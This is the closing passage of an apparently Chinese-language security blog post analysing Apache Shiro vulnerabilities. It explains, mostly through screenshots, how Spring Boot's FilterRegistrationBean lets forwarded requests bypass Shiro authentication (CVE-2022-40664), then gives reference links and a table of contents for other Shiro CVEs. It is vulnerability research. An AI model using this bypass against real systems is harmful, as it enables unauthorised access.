+<p><img src="https://s2.loli.net/2022/10/22/zZLeBNbaqKCTvDH.png" alt="image-20221019120401474"></p>
+<p><img src="https://s2.loli.net/2022/10/22/Ul28JQqu6TXYcM4.png" alt="image-20221019120446172"></p>
+<p><img src="https://s2.loli.net/2022/10/22/wZShgfxyLs9Q1XH.png" alt="image-20221019120517079"></p>
+<p><img src="https://s2.loli.net/2022/10/22/bGHFTUmRo1zN9Oc.png" alt="image-20221019120536825"></p>
+<p><img src="https://s2.loli.net/2022/10/22/QN4a3kO8XzGvDBF.png" alt="image-20221019120627089"></p>
+<p><img src="https://s2.loli.net/2022/10/22/Yjstea3wy2VxcBp.png" alt="image-20221019120739690"></p>
+<p>而上述demo引入filter的方法正是filterRegistrationBean</p>
+<p><img src="https://s2.loli.net/2022/10/22/lT8hdfZjsQaLB3o.png" alt="image-20221019120834068"></p>
+<p>接下来看看FilterRegistrationBean的执行流程</p>
+<p>首先会去调用父类方法</p>
+<p><code>org.springframework.boot.web.servlet.RegistrationBean#onStartup</code></p>
+<p><img src="https://s2.loli.net/2022/10/22/WAaMmKuzlRYE8p6.png" alt="image-20221019121020767"></p>
+<p><img src="https://s2.loli.net/2022/10/22/HSL2Bla41cf5TZO.png" alt="image-20221019121054582"></p>
+<p><img src="https://s2.loli.net/2022/10/22/2vpG9mPC1ad8yVS.png" alt="image-20221019121127873"></p>
+<p>问题就出在这里，如果filter的父类不是<code>org.springframework.web.filter.OncePerRequestFilter</code>，那么<code>dispatcherTypes</code>就仅仅是<code>DispatcherType.REQUEST</code>，这就导致forward请求可以绕过shiro的鉴权。</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://su18.org/post/shiro-5/">https://su18.org/post/shiro-5/</a></p>
+<p><a href="https://tttang.com/archive/1645/#toc__10">https://tttang.com/archive/1645/#toc__10</a></p>
+<p><a href="https://shiro.apache.org/">https://shiro.apache.org/</a></p>
+<p><a href="https://blog.csdn.net/xyjy11/article/details/127324055">https://blog.csdn.net/xyjy11/article/details/127324055</a></p>
+<p><a href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/</a></p>
+<p><a href="https://zhangzeyu2001.medium.com/attacking-cbc-mode-bit-flipping-7e0a1c185511">https://zhangzeyu2001.medium.com/attacking-cbc-mode-bit-flipping-7e0a1c185511</a></p>
+<p><a href="https://ho1aas.blog.csdn.net/article/details/125404334?spm=1001.2101.3001.6650.10&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-10-125404334-blog-126933772.t0_edu_mix&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-10-125404334-blog-126933772.t0_edu_mix&amp;utm_relevant_index=18">https://ho1aas.blog.csdn.net/article/details/125404334?spm=1001.2101.3001.6650.10&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-10-125404334-blog-126933772.t0_edu_mix&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-10-125404334-blog-126933772.t0_edu_mix&amp;utm_relevant_index=18</a></p>
+
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#太长不看">太长不看</a></li>
+        <li><a href="#shiro-简介">shiro 简介</a></li>
+        <li><a href="#servlet-filter">Servlet Filter</a></li>
+        <li><a href="#基本使用">基本使用</a>
+          <ul>
+            <li><a href="#web-ini-configuration">Web INI configuration</a></li>
+            <li><a href="#demo">Demo</a></li>
+          </ul>
+        </li>
+        <li><a href="#cve-2010-3863">CVE-2010-3863</a>
+          <ul>
+            <li><a href="#复现">复现</a></li>
+            <li><a href="#分析">分析</a></li>
+            <li><a href="#进一步思考----springboot-路由">进一步思考 &ndash; springboot 路由</a></li>
+            <li><a href="#修复">修复</a></li>
+          </ul>
+        </li>
+        <li><a href="#cve-2016-4437shiro550">CVE-2016-4437	(shiro550)</a>
+          <ul>
+            <li><a href="#脚本小子">脚本小子</a></li>
+            <li><a href="#漏洞分析">漏洞分析</a></li>
+          </ul>
+        </li>
+        <li><a href="#cve-2019-12422-shiro721">CVE-2019-12422 (shiro721)</a>
+          <ul>
+            <li><a href="#太长不看-1">太长不看</a></li>
+            <li><a href="#某数学渣渣的粗浅理解">某数学渣渣的粗浅理解</a></li>
+            <li><a href="#利用脚本">利用脚本</a></li>
+          </ul>
+        </li>
+        <li><a href="#cve-2022-40664">CVE-2022-40664</a>
+          <ul>
+            <li><a href="#复现-1">复现</a></li>
+            <li><a href="#分析-1">分析</a></li>
+          </ul>
+        </li>
+        <li><a href="#参考文章">参考文章</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2022 </span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
